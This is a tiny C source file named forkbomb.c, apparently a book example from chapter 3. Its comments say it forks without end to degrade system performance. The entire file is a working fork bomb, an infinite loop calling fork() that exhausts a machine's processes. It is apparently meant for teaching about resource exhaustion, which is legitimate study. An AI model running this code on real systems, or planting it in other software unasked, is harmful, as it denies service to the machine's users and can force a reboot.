/* forkbomb.c				*/
/* This program contiues forking while	*/
/* run, degrading system performance.	*/
/* This appears in chapter 3.		*/

#include <stdio.h>

int main()
{
	for(;;)
		fork();
}
